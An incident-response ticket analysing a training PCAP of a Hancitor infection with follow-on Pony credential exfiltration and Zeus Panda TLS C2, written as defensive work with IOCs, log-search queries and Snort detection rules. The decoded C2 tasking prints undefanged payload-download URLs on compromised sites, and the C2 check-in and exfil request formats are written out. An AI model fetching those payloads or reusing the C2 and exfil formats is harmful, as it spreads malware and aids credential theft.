@@ -1,0 +1,207 @@
+# Traffic Analysis Ticket – 180511 – CHICAGO-7FA3-PC (10.0.14.129)
+
+Source: malware-traffic-analysis.net 2018-05-11 exercise "Night Dew" (2018-05-11-traffic-analysis-exercise.pcap, SHA256 b2c8d0fed6765dc4d2036fae6587a3bac9c27184a3032bd3899eefac4d13e51e).
+Operator name "Sung" and operator log times are placeholders — replace with your actual operator name and analysis times.
+Ticket links (Inv##) are placeholders.
+
+====================================================================
+TICKET 1 – Hancitor infection: HTTP C2, payload downloads, likely credential exfil and follow-on HTTPS C2 (lysedsohap.com, robwassotdint.ru)
+====================================================================
+
+#INDEX ENTRY#
+
+[] – 261119 2335 – 10.0.14.129 CHICAGO-7FA3-PC – Hancitor infection with likely credential exfil and follow-on Zeus Panda HTTPS C2 to robwassotdint.ru – http://ticket:9001/p/Inv##
+
+
+#FINAL SUMMARY OF TICKET# (End of Mission / Closing of Ticket – MC ENTRY ONLY)
+
+
+
+#TICKET METADATA#
+
+OPERATOR: Sung
+
+TIME OF INCIDENT: 180511 02:08:04 UTC
+
+RELATED TICKETS:
+
+
+DESCRIPTION OF INVESTIGATION:
+
+At 180511 02:08:04 UTC CHICAGO-7FA3-PC (10.0.14.129, user faith.hoffman) began Hancitor-style C2 via http (port 80) to 185.43.223.6 (lysedsohap[.]com), checking in every ~2 min until end of capture. On C2 tasking it downloaded 3 encrypted payloads (~253 KB) from 111.90.144.30 (wansaiful[.]com) at 02:08:05–02:08:15, then sent 2 encrypted POSTs (440 B) to lysedsohap[.]com – likely credential exfil (Pony).
+
+From 02:10:16 the host also ran a second C2 via https (port 443) to 185.174.175.14 (robwassotdint[.]ru): 54 TLS sessions in ~5 min bursts until 02:45:46, self-signed OpenSSL default certificate, ~1.65 MB received – consistent with Zeus Panda Banker (unconfirmed). Initial access not in capture; host confirmation and malware analysis required.
+
+
+#IMPACTED INTERNAL MACHINES#
+
+INTERNAL IP/s & HOSTNAME/s:
+
+10.0.14.129 CHICAGO-7FA3-PC (MAC 00:1a:92:06:5c:7b, ASUSTek) – Windows 7 x64, domain NIGHTDEW (nightdew.org), user faith.hoffman
+
+INTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)
+
+INTERNAL DESTINATION PORT/s:
+
+LATERAL SOURCE PORT/s: (If Ephemeral Leave Blank unless required)
+
+LATERAL DESTINATION PORT/s:
+
+(No lateral movement observed – traffic to DC 10.0.14.3 is normal logon, DNS and group policy only.)
+
+
+#EXTERNAL MACHINES#
+
+EXTERNAL IP/s & HOSTNAME/s:
+
+185.43.223.6 (lysedsohap[.]com) – Hancitor-style C2 and exfil destination
+
+111.90.144.30 (wansaiful[.]com) – payload download (likely compromised WordPress site)
+
+185.174.175.14 (robwassotdint[.]ru) – HTTPS C2 server (likely Zeus Panda Banker)
+
+Backup payload URLs from the decoded C2 reply (not contacted in this capture):
+www.victoryoutreachvallejo[.]com, medleysoup[.]com, radiantheartcoaching[.]com, hdmicablereviews[.]com
+
+184.72.249.110 (api.ipify[.]org) – public IP lookup used by the malware (legitimate service, not malicious itself)
+
+EXTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)
+
+EXTERNAL DESTINATION PORT/s: (If Ephemeral Leave Blank.)
+
+Port 80 – HTTP (Hancitor C2 check-ins, payload download, exfil)
+Port 443 – HTTPS (TLS 1.2 C2 to robwassotdint.ru)
+
+
+#SEARCH QUERIES#
+
+ARKIME: (Format= [What Command Finds] - <Command>)
+
+[Hancitor check-ins and exfil POSTs to lysedsohap.com] - ip.src == 10.0.14.129 && host.http == lysedsohap.com
+
+[Follow-up payload downloads from wansaiful.com] - ip.src == 10.0.14.129 && host.http == wansaiful.com
+
+[Pony-style exfil POSTs (binary request body)] - ip.src == 10.0.14.129 && http.request.content-type == application/octet-stream
+
+[Public IP lookup before first check-in] - ip.src == 10.0.14.129 && host.http == api.ipify.org
+
+[DNS lookups of malicious domains] - ip.src == 10.0.14.129 && host.dns == [lysedsohap.com, wansaiful.com]
+
+[TLS C2 sessions to robwassotdint.ru] - ip.src == 10.0.14.129 && ip.dst == 185.174.175.14 && port.dst == 443
+
+[Self-signed OpenSSL default certificate] - cert.issuer.on == "Default Company Ltd"
+
+[DNS lookup of robwassotdint.ru] - host.dns == robwassotdint.ru
+
+SPLUNK: (Format= [What Command Finds] - <Command>)
+
+[Hancitor check-ins and exfil POSTs] - index=zeek sourcetype=zeek:http id_orig_h=10.0.14.129 host="lysedsohap.com" method=POST
+
+[Follow-up payload downloads] - index=zeek sourcetype=zeek:http id_orig_h=10.0.14.129 host="wansaiful.com"
+
+[Malicious IP traffic] - index=zeek sourcetype=zeek:conn id_orig_h=10.0.14.129 id_resp_h IN (185.43.223.6, 111.90.144.30, 185.174.175.14)
+
+[TLS C2 sessions to robwassotdint.ru] - index=zeek sourcetype=zeek:ssl id_orig_h=10.0.14.129 server_name="robwassotdint.ru"
+
+[Self-signed OpenSSL default certificate] - index=zeek sourcetype=zeek:x509 "Default Company Ltd"
+
+SNORT: (Format= [What Command Finds] - <Command>)
+
+[Hancitor check-in POST via http] - alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Hancitor-style check-in POST to /4/forum.php - Sung"; flow:to_server,established; content:"POST"; http_method; content:"/4/forum.php"; http_uri; content:"GUID="; http_client_body; depth:5; content:"&BUILD="; http_client_body; distance:0; content:"&INFO="; http_client_body; distance:0; classtype:trojan-activity; sid:1000011; rev:1;)
+
+[wansaiful.com payload download via http] - alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Hancitor follow-up payload download from wansaiful.com - Sung"; flow:to_server,established; content:"GET"; http_method; content:"/wp-content/plugins/easy-media-download/"; http_uri; content:"wansaiful.com"; http_header; classtype:trojan-activity; sid:1000012; rev:1;)
+
+[Pony-style exfil POST via http] - alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Pony-style credential exfil POST with Content-Encoding binary - Sung"; flow:to_server,established; content:"POST"; http_method; content:"Content-Type|3a| application/octet-stream"; http_header; content:"Content-Encoding|3a| binary"; http_header; classtype:trojan-activity; sid:1000013; rev:1;)
+
+[DNS query for lysedsohap.com] - alert udp $HOME_NET any -> any 53 (msg:"DNS query for Hancitor C2 lysedsohap.com - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|0a|lysedsohap|03|com|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000016; rev:1;)
+
+[DNS query for wansaiful.com] - alert udp $HOME_NET any -> any 53 (msg:"DNS query for Hancitor payload host wansaiful.com - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|09|wansaiful|03|com|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000018; rev:1;)
+
+[SNI robwassotdint.ru via https] - alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"TLS Client Hello SNI robwassotdint.ru (Zeus Panda C2) - Sung"; flow:to_server,established; content:"|16 03|"; depth:2; content:"|01|"; offset:5; depth:1; content:"robwassotdint.ru"; nocase; classtype:trojan-activity; sid:1000014; rev:1;)
+
+[Default Company Ltd certificate via https] - alert tcp $EXTERNAL_NET 443 -> $HOME_NET any (msg:"TLS certificate with OpenSSL default subject Default Company Ltd from external server - Sung"; flow:to_client,established; content:"Default Company Ltd"; classtype:bad-unknown; sid:1000015; rev:1;)
+
+[DNS query for robwassotdint.ru] - alert udp $HOME_NET any -> any 53 (msg:"DNS query for Zeus Panda C2 robwassotdint.ru - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|0d|robwassotdint|02|ru|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000017; rev:1;)
+
+(Tested against the PCAP with Snort 2.9.20: 1000011 = 21, 1000012 = 3, 1000013 = 2, 1000014 = 54, 1000015 = 54, 1000016 = 2, 1000017 = 2, 1000018 = 1 alerts – all as expected, none on benign traffic.)
+
+
+#EVIDENCE LOCATIONS#
+
+Team<#>: /home/<username>/evidence/180511_lysedsohap_com_hancitor_c2.pcap
+Team<#>: /home/<username>/evidence/180511_wansaiful_com_payload_download.pcap
+Team<#>: /home/<username>/evidence/180511_lysedsohap_com_exfil_posts.pcap
+Team<#>: /home/<username>/evidence/180511_robwassotdint_ru_tls_c2.pcap
+
+
+#OFFICIAL LOGGING AND ARTEFACTS#
+
+#OPERATOR LOG#
+
+[2335 261119, Sung] – Investigating repeated HTTP POSTs from 10.0.14.129 to lysedsohap.com (185.43.223.6) for C2 – Found – Further Analysis Required
+
+[2348 261119, Sung] – Decoding the first C2 response from lysedsohap.com for tasking – Found – Further Analysis Required
+
+[2355 261119, Sung] – Looking for follow-up downloads by 10.0.14.129 ordered by the C2 – Found – Further Analysis Required
+
+[0004 261120, Sung] – Looking for data sent out by 10.0.14.129 to lysedsohap.com other than check-ins (exfil) – Found
+
+[0010 261120, Sung] – Looking for activity on 10.0.14.129 preceding the first C2 check-in (initial access) – Not Found
+
+[0018 261120, Sung] – Investigating repeated TLS sessions from 10.0.14.129 to robwassotdint.ru (185.174.175.14) for C2 – Found – Further Analysis Required
+
+[0026 261120, Sung] – Checking the TLS certificate presented by 185.174.175.14 – Found
+
+
+#TOOL OUTPUT / ANALYST NOTES#
+
+[2335 261119, Sung] Hancitor-style C2 confirmed: 21 HTTP/1.1 POSTs to lysedsohap.com/4/forum.php (185.43.223.6:80) every ~120 s (02:08:04–02:48:25), no Referer. Body leaks hostname, domain\user, public IP and OS. Public IP came from api.ipify.org 0.5 s before the first check-in.
+
+    180511 02:08:04 UTC  10.0.14.129  49197  184.72.249.110  80  GET   200  api.ipify.org/  Response body: 173.236.56.182
+    180511 02:08:04 UTC  10.0.14.129  49198  185.43.223.6    80  POST  200  lysedsohap.com/4/forum.php  HTTP/1.1
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko  Referer: (none)
+    Request Content-Type: application/x-www-form-urlencoded  Content-Length: 123
+    Body: GUID=10412771973665002240&BUILD=09fhx05&INFO=CHICAGO-7FA3-PC @ NIGHTDEW\faith.hoffman&IP=173.236.56.182&TYPE=1&WIN=6.1(x64)
+    Response: Server nginx/1.10.2  X-Powered-By PHP/5.4.45  Transfer-Encoding chunked  Body: base64 text (1436 B)
+    Check-ins: 02:08:04 02:10:15 02:12:16 ... 02:46:25 02:48:25 (21 total, same 123 B body each time)
+
+[2348 261119, Sung] First C2 reply decoded in CyberChef (From Base64 -> XOR key 0x7A): 3 download commands (l, b, r), each listing the same file on 5 sites (compromised WordPress). Host used the first site only. All 20 later replies (12 B) decode to {n:} = no task.
+
+    {l:http://wansaiful.com/wp-content/plugins/easy-media-download/1|http://www.victoryoutreachvallejo.com/wp-content/plugins/regenerate-thumbnails/includes/1|http://medleysoup.com/wp-content/plugins/comicpress-manager/1|http://radiantheartcoaching.com/blog/wp-content/themes/twentyten/1|http://hdmicablereviews.com/wp-content/plugins/google-sitemap-generator/1}
+    {b:<same 5 sites>/2}
+    {r:<same 5 sites>/3}
+
+[2355 261119, Sung] 3 payloads downloaded from wansaiful.com (111.90.144.30) in one keep-alive session, starting 1 s after the C2 reply. Served as text/plain but content is encrypted binary (no MZ header) – hashes below are of the encrypted network files, not the decoded executables. Host analysis required.
+
+    180511 02:08:05 UTC  10.0.14.129  49199  111.90.144.30  80  GET  200  wansaiful.com/wp-content/plugins/easy-media-download/1  46341 B
+    180511 02:08:13 UTC  10.0.14.129  49199  111.90.144.30  80  GET  200  wansaiful.com/wp-content/plugins/easy-media-download/2  47383 B
+    180511 02:08:14 UTC  10.0.14.129  49199  111.90.144.30  80  GET  200  wansaiful.com/wp-content/plugins/easy-media-download/3  159255 B
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko  Referer: (none)
+    Content-Type: text/plain  Server: nginx  Last-Modified: Thu, 10 May 2018 13:29:43 / 13:29:50 / 13:29:58 GMT
+    /1  MD5 ae9dfd2190b07927078cb4a19d0b2187  SHA256 e1011c8688b88154d7c942895bd5a00abff857677581b638651a84d5eb77df45
+    /2  MD5 74eb0ec9c04ddf315053773aba5bcb01  SHA256 a19b56853afe9d6ba3d3b897b54dd3eee68730e630b48d7aae587a01bf5ffc74
+    /3  MD5 b799ac083efb27e51c46ea1542f89b12  SHA256 97ca86f8d6c62efb24219db591b7a97e261f25a40c5d9d92329d7e0d9ff8e4d9
+
+[0004 261120, Sung] 2 one-off encrypted POSTs to lysedsohap.com from a different program (HTTP/1.0, MSIE 7.0 User-Agent, non-standard "Content-Encoding: binary") right after the downloads – likely stolen credentials, consistent with Pony. 440 B total sent; content encrypted.
+
+    180511 02:08:12 UTC  10.0.14.129  49200  185.43.223.6  80  POST  200  lysedsohap.com/mlu/forum.php  HTTP/1.0  Content-Length: 206
+    180511 02:08:14 UTC  10.0.14.129  49202  185.43.223.6  80  POST  200  lysedsohap.com/d2/about.php   HTTP/1.0  Content-Length: 234
+    Content-Type: application/octet-stream  Content-Encoding: binary  Connection: close  Accept-Language: en-US
+    User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+
+[0010 261120, Sung] No email, document download or Office traffic before the first check-in. Only DHCP (02:06:51, host start-up), Windows NCSI (02:07:02) and faith.hoffman Kerberos logon to DC 10.0.14.3 (02:07:29) precede it. Infection likely predates the capture (persistence at logon) or came from a local file – host check required: Run keys, scheduled tasks, recent Office documents, email attachments.
+
+[0018 261120, Sung] New C2 after the payload downloads: robwassotdint.ru first resolved at 02:10:16 (never before), then 54 TLS 1.2 sessions to 185.174.175.14:443 in bursts every ~5 min. Small beacon sessions are near-identical (1,442 B received / 992 B sent); large downloads at 02:40–02:42. ~120 KB sent / ~1.65 MB received – no large exfil visible.
+
+    180511 02:10:16 UTC  10.0.14.129 -> 10.0.14.3:53  DNS  A robwassotdint.ru  Answer: 185.174.175.14
+    180511 02:10:16 UTC  10.0.14.129  49206  185.174.175.14  443  TLSv1.2  SNI robwassotdint.ru  Cipher TLS_RSA_WITH_AES_128_CBC_SHA256
+    Burst start (UTC)  02:10:16  02:15:20  02:20:16  02:25:27  02:30:18  02:35:35  02:40:16  02:42:27  02:45:43
+    Sessions           4         4         6         4         6         4         14        8         4
+    Largest sessions   02:42:28 49274 recv 421 KB   02:42:31 49276 recv 524 KB   02:40:21 49264 recv 206 KB
+
+[0026 261120, Sung] Self-signed certificate with OpenSSL default values and no CN – does not match SNI robwassotdint.ru. Created 12 days before the capture. Presented in all 54 sessions.
+
+    Subject: O=Default Company Ltd, L=Default City, C=XX
+    Issuer:  O=Default Company Ltd, L=Default City, C=XX
+    Serial:  00becd5c26e55fc46f
+    Validity: 2018-04-29 19:20:31 UTC – 2023-10-20 19:20:31 UTC
